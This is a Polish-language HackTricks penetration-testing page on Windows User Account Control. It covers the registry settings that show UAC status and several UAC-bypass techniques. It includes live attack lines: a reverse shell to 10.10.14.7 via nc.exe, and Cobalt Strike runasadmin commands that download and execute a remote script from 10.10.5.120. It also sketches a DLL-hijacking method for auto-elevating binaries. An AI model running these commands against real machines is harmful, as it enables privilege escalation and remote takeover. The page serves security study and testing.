# UAC - Kontrola Konta Użytkownika

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Kontrola Konta Użytkownika (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja, która umożliwia **wyświetlanie komunikatu o zgodzie na podwyższone działania**. Aplikacje mają różne poziomy `integrity`, a program z **wysokim poziomem** może wykonywać zadania, które **mogą potencjalnie zagrozić systemowi**. Gdy UAC jest włączone, aplikacje i zadania zawsze **działają w kontekście bezpieczeństwa konta nie-administratora**, chyba że administrator wyraźnie autoryzuje te aplikacje/zadania do uzyskania dostępu na poziomie administratora w celu ich uruchomienia. Jest to funkcja ułatwiająca, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uważana za granicę bezpieczeństwa.

Aby uzyskać więcej informacji na temat poziomów integralności:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Gdy UAC jest aktywne, użytkownik z uprawnieniami administratora otrzymuje 2 tokeny: standardowy klucz użytkownika, aby wykonywać regularne działania na poziomie zwykłym, oraz jeden z uprawnieniami administratora.

Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) szczegółowo omawia, jak działa UAC, w tym proces logowania, doświadczenie użytkownika i architekturę UAC. Administratorzy mogą używać polityk bezpieczeństwa do konfigurowania działania UAC specyficznie dla swojej organizacji na poziomie lokalnym (używając secpol.msc) lub skonfigurować i wdrożyć za pomocą Obiektów Polityki Grupowej (GPO) w środowisku domeny Active Directory. Różne ustawienia są szczegółowo omówione [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Istnieje 10 ustawień Polityki Grupowej, które można ustawić dla UAC. Poniższa tabela zawiera dodatkowe szczegóły:

| Ustawienie Polityki Grupowej                                                                                                                                                                                                                                                                                                                                                           | Klucz Rejestru             | Ustawienie Domyślne                                         |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ----------------------------------------------------------- |
| [Kontrola Konta Użytkownika: Tryb Zatwierdzania Administratora dla wbudowanego konta Administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Wyłączone                                                   |
| [Kontrola Konta Użytkownika: Zezwól aplikacjom UIAccess na wyświetlanie komunikatu o podwyższeniu bez użycia bezpiecznego pulpitu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Wyłączone                                                   |
| [Kontrola Konta Użytkownika: Zachowanie komunikatu o podwyższeniu dla administratorów w Trybie Zatwierdzania Administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prośba o zgodę dla nie-Windowsowych binariów              |
| [Kontrola Konta Użytkownika: Zachowanie komunikatu o podwyższeniu dla standardowych użytkowników](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prośba o dane uwierzytelniające na bezpiecznym pulpicie    |
| [Kontrola Konta Użytkownika: Wykrywanie instalacji aplikacji i prośba o podwyższenie](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Włączone (domyślne dla domów) Wyłączone (domyślne dla przedsiębiorstw) |
| [Kontrola Konta Użytkownika: Podwyższaj tylko pliki wykonywalne, które są podpisane i zweryfikowane](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Wyłączone                                                   |
| [Kontrola Konta Użytkownika: Podwyższaj tylko aplikacje UIAccess, które są zainstalowane w bezpiecznych lokalizacjach](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Włączone                                                   |
| [Kontrola Konta Użytkownika: Uruchom wszystkich administratorów w Trybie Zatwierdzania Administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Włączone                                                   |
| [Kontrola Konta Użytkownika: Przełącz na bezpieczny pulpit podczas prośby o podwyższenie](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Włączone                                                   |
| [Kontrola Konta Użytkownika: Wirtualizuj niepowodzenia zapisu plików i rejestru do lokalizacji per-user](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Włączone                                                   |

### Teoria Ominięcia UAC

Niektóre programy są **automatycznie podwyższane**, jeśli **użytkownik należy** do **grupy administratorów**. Te binaria mają w swoich _**Manifeście**_ opcję _**autoElevate**_ z wartością _**True**_. Binarne musi być również **podpisane przez Microsoft**.

Aby **ominąć** **UAC** (podwyższyć z **średniego** poziomu integralności **do wysokiego**), niektórzy atakujący używają tego rodzaju binariów do **wykonywania dowolnego kodu**, ponieważ będzie on wykonywany z **procesu o wysokim poziomie integralności**.

Możesz **sprawdzić** _**Manifest**_ binarnego za pomocą narzędzia _**sigcheck.exe**_ z Sysinternals. A możesz **zobaczyć** **poziom integralności** procesów używając _Process Explorer_ lub _Process Monitor_ (z Sysinternals).

### Sprawdź UAC

Aby potwierdzić, czy UAC jest włączone, wykonaj:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Jeśli to jest **`1`**, to UAC jest **aktywowany**, jeśli to jest **`0`** lub **nie istnieje**, to UAC jest **nieaktywny**.

Następnie sprawdź **jaki poziom** jest skonfigurowany:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Jeśli **`0`**, to UAC nie będzie pytać (jak **wyłączone**)
- Jeśli **`1`**, administrator jest **proszony o nazwę użytkownika i hasło** do wykonania binarnego z wysokimi uprawnieniami (na Secure Desktop)
- Jeśli **`2`** (**Zawsze powiadamiaj mnie**) UAC zawsze poprosi o potwierdzenie administratora, gdy spróbuje wykonać coś z wysokimi uprawnieniami (na Secure Desktop)
- Jeśli **`3`**, jak `1`, ale niekoniecznie na Secure Desktop
- Jeśli **`4`**, jak `2`, ale niekoniecznie na Secure Desktop
- Jeśli **`5`** (**domyślnie**), poprosi administratora o potwierdzenie uruchomienia binarnych niebędących systemem Windows z wysokimi uprawnieniami

Następnie musisz spojrzeć na wartość **`LocalAccountTokenFilterPolicy`**\
Jeśli wartość to **`0`**, to tylko użytkownik **RID 500** (**wbudowany Administrator**) może wykonywać **zadania administracyjne bez UAC**, a jeśli to `1`, **wszystkie konta w grupie "Administratorzy"** mogą to robić.

I na koniec spójrz na wartość klucza **`FilterAdministratorToken`**\
Jeśli **`0`** (domyślnie), **wbudowane konto Administratora może** wykonywać zadania zdalnej administracji, a jeśli **`1`**, wbudowane konto Administratora **nie może** wykonywać zdalnych zadań administracyjnych, chyba że `LocalAccountTokenFilterPolicy` jest ustawione na `1`.

#### Podsumowanie

- Jeśli `EnableLUA=0` lub **nie istnieje**, **brak UAC dla nikogo**
- Jeśli `EnableLua=1` i **`LocalAccountTokenFilterPolicy=1`, brak UAC dla nikogo**
- Jeśli `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` oraz `FilterAdministratorToken=0`, brak UAC dla RID 500 (Wbudowany Administrator)**
- Jeśli `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` oraz `FilterAdministratorToken=1`, UAC dla wszystkich**

Wszystkie te informacje można zebrać za pomocą modułu **metasploit**: `post/windows/gather/win_privs`

Możesz również sprawdzić grupy swojego użytkownika i uzyskać poziom integralności:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!NOTE]
> Zauważ, że jeśli masz dostęp graficzny do ofiary, obejście UAC jest proste, ponieważ możesz po prostu kliknąć "Tak", gdy pojawi się monit UAC.

Obejście UAC jest potrzebne w następującej sytuacji: **UAC jest aktywowany, twój proces działa w kontekście średniej integralności, a twój użytkownik należy do grupy administratorów**.

Ważne jest, aby wspomnieć, że **znacznie trudniej jest obejść UAC, jeśli jest na najwyższym poziomie bezpieczeństwa (Zawsze) niż jeśli jest na którymkolwiek z innych poziomów (Domyślny).**

### UAC disabled

Jeśli UAC jest już wyłączony (`ConsentPromptBehaviorAdmin` to **`0`**), możesz **wykonać odwrotny shell z uprawnieniami administratora** (wysoki poziom integralności) używając czegoś takiego:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Ominięcie UAC z duplikacją tokenów

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Bardzo** podstawowe "ominięcie" UAC (pełny dostęp do systemu plików)

Jeśli masz powłokę z użytkownikiem, który jest w grupie Administratorzy, możesz **zamontować C$** udostępnione przez SMB (system plików) lokalnie na nowym dysku i będziesz miał **dostęp do wszystkiego w systemie plików** (nawet do folderu domowego Administratora).

> [!WARNING]
> **Wygląda na to, że ten trik już nie działa**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC obejście z Cobalt Strike

Techniki Cobalt Strike będą działać tylko wtedy, gdy UAC nie jest ustawione na maksymalny poziom bezpieczeństwa.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** mają również kilka modułów do **obejścia** **UAC**.

### KRBUACBypass

Dokumentacja i narzędzie w [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Eksploity obejścia UAC

[**UACME** ](https://github.com/hfiref0x/UACME), który jest **kompilacją** kilku eksploity do obejścia UAC. Zauważ, że będziesz musiał **skompilować UACME używając visual studio lub msbuild**. Kompilacja stworzy kilka plików wykonywalnych (jak `Source\Akagi\outout\x64\Debug\Akagi.exe`), będziesz musiał wiedzieć **który potrzebujesz.**\
Powinieneś **być ostrożny**, ponieważ niektóre obejścia mogą **wywołać inne programy**, które **powiadomią** **użytkownika**, że coś się dzieje.

UACME ma **wersję kompilacji, od której każda technika zaczęła działać**. Możesz wyszukiwać technikę wpływającą na twoje wersje:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

#### Więcej obejść UAC

**Wszystkie** techniki używane tutaj do obejścia UAC **wymagają** **pełnego interaktywnego powłoki** z ofiarą (zwykła powłoka nc.exe nie wystarczy).

Możesz uzyskać dostęp za pomocą sesji **meterpreter**. Przenieś się do **procesu**, który ma wartość **Session** równą **1**:

![](<../../images/image (96).png>)

(_explorer.exe_ powinien działać)

### Obejście UAC z GUI

Jeśli masz dostęp do **GUI, możesz po prostu zaakceptować monit UAC**, gdy go otrzymasz, naprawdę nie potrzebujesz obejścia. Uzyskanie dostępu do GUI pozwoli ci obejść UAC.

Co więcej, jeśli uzyskasz sesję GUI, z której ktoś korzystał (potencjalnie przez RDP), istnieją **niektóre narzędzia, które będą działać jako administrator**, z których możesz **uruchomić** na przykład **cmd** bezpośrednio **jako administrator** bez ponownego wywoływania monitu UAC, jak [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Może to być nieco bardziej **ukryte**.

### Hałaśliwe obejście UAC brute-force

Jeśli nie zależy ci na hałasie, zawsze możesz **uruchomić coś takiego jak** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), które **prosi o podniesienie uprawnień, aż użytkownik to zaakceptuje**.

### Twoje własne obejście - Podstawowa metodologia obejścia UAC

Jeśli spojrzysz na **UACME**, zauważysz, że **większość obejść UAC nadużywa podatności Dll Hijacking** (głównie pisząc złośliwy dll w _C:\Windows\System32_). [Przeczytaj to, aby dowiedzieć się, jak znaleźć podatność Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Znajdź binarny, który będzie **autoelevate** (sprawdź, czy po uruchomieniu działa na wysokim poziomie integralności).
2. Za pomocą procmon znajdź zdarzenia "**NAME NOT FOUND**", które mogą być podatne na **DLL Hijacking**.
3. Prawdopodobnie będziesz musiał **napisać** DLL wewnątrz niektórych **chronionych ścieżek** (takich jak C:\Windows\System32), gdzie nie masz uprawnień do zapisu. Możesz to obejść, używając:
   1. **wusa.exe**: Windows 7, 8 i 8.1. Umożliwia to wyodrębnienie zawartości pliku CAB w chronionych ścieżkach (ponieważ to narzędzie jest uruchamiane z wysokiego poziomu integralności).
   2. **IFileOperation**: Windows 10.
4. Przygotuj **skrypt**, aby skopiować swój DLL do chronionej ścieżki i uruchomić podatny i autoelevated binarny.

### Inna technika obejścia UAC

Polega na obserwowaniu, czy **autoElevated binary** próbuje **odczytać** z **rejestru** **nazwę/ścieżkę** **binarnego** lub **komendy** do **wykonania** (to jest bardziej interesujące, jeśli binarny szuka tych informacji w **HKCU**).

{{#include ../../banners/hacktricks-training.md}}
